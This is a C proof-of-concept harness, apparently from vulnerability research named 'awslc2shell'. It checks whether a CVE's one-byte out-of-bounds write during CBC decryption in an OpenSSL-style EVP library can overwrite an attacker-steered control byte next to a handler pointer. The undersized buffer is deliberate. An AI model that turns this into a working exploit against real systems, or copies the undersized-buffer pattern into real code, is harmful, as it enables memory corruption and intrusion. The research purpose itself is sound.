// awslc2shell W208: can the CVE's one-byte OOB write reach a control datum in
// natural C layout? A documented-minimum uint8_t buf[31] is followed by a
// uint8_t state at struct offset 31 and an 8-aligned handler pointer at 32.
// No #pragma pack, no leading tag, no dispatch table: the byte written at
// buf[31] is exactly &state. Built against non-ASan pinned libs so the write
// lands in the real struct, not an ASan redzone.
// Usage: global-datum-vuln vuln|safe|steer | global-datum-fixed fixed
#include <openssl/evp.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define CHOSEN 0x48 /* 'H', plaintext byte 31 in vuln/fixed modes */
#define STATE_CANARY 0xa5

static const uint8_t kKey[16] = {0, 1, 2, 3, 4, 5, 6, 7,
                                 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t kIv[16] = {0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                                0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};

struct record {
  uint8_t buf[31];
  uint8_t state;
  void (*handler)(void);
};

static struct record g;

static void normal_handler(void) {}

static int make_ciphertext(uint8_t *ct, int *ct_len, uint8_t chosen) {
  uint8_t pt[32];
  for (int i = 0; i < 32; i++) {
    pt[i] = (uint8_t)i;
  }
  pt[31] = chosen;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0, f = 0, ok = 0;
  if (ctx != NULL &&
      EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv) &&
      EVP_EncryptUpdate(ctx, ct, &n, pt, 32) &&
      EVP_EncryptFinal_ex(ctx, ct + n, &f) && n + f == 48) {
    *ct_len = n + f;
    ok = 1;
  }
  EVP_CIPHER_CTX_free(ctx);
  return ok;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s MODE\n", argv[0]);
    return 2;
  }
  const char *mode = argv[1];
  uint8_t chosen, state_init, expected;
  if (strcmp(mode, "vuln") == 0) {
    chosen = CHOSEN;
    state_init = STATE_CANARY;
    expected = CHOSEN;
  } else if (strcmp(mode, "fixed") == 0) {
    chosen = CHOSEN;
    state_init = STATE_CANARY;
    expected = STATE_CANARY;
  } else if (strcmp(mode, "steer") == 0) {
    chosen = 0x01;
    state_init = STATE_CANARY;
    expected = 0x01;
  } else if (strcmp(mode, "safe") == 0) {
    chosen = 0x00;
    state_init = 0x00;
    expected = 0x00;
  } else {
    fprintf(stderr, "unknown mode %s\n", mode);
    return 2;
  }

  uint8_t ct[64];
  int ct_len = 0;
  if (!make_ciphertext(ct, &ct_len, chosen)) {
    return 2;
  }

  memset(&g, 0, sizeof(g));
  g.state = state_init;
  g.handler = normal_handler;
  const uint8_t state_before = g.state;
  const uint8_t handler_lsb_before = (uint8_t)((uintptr_t)g.handler & 0xff);

  // Two boundary-crossing updates into the documented-minimum buf[31]: the
  // second writes 32 bytes, so plaintext byte 31 lands on &g.state.
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0;
  int ok = ctx != NULL &&
           EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv);
  for (int off = 0; ok && off < 32; off += 16) {
    ok = EVP_DecryptUpdate(ctx, g.buf, &n, ct + off, 16);
  }
  EVP_CIPHER_CTX_free(ctx);

  const uint8_t state_after = g.state;
  const uint8_t handler_lsb_after = (uint8_t)((uintptr_t)g.handler & 0xff);
  printf("%s: buf_off=%zu state_off=%zu handler_off=%zu struct_size=%zu "
         "chosen=0x%02x state_before=0x%02x state_after=0x%02x "
         "expected=0x%02x handler_lsb_before=0x%02x handler_lsb_after=0x%02x "
         "decrypt_ok=%d\n",
         mode, offsetof(struct record, buf), offsetof(struct record, state),
         offsetof(struct record, handler), sizeof(g), chosen, state_before,
         state_after, expected, handler_lsb_before, handler_lsb_after, ok);
  return state_after == expected ? 0 : 1;
}
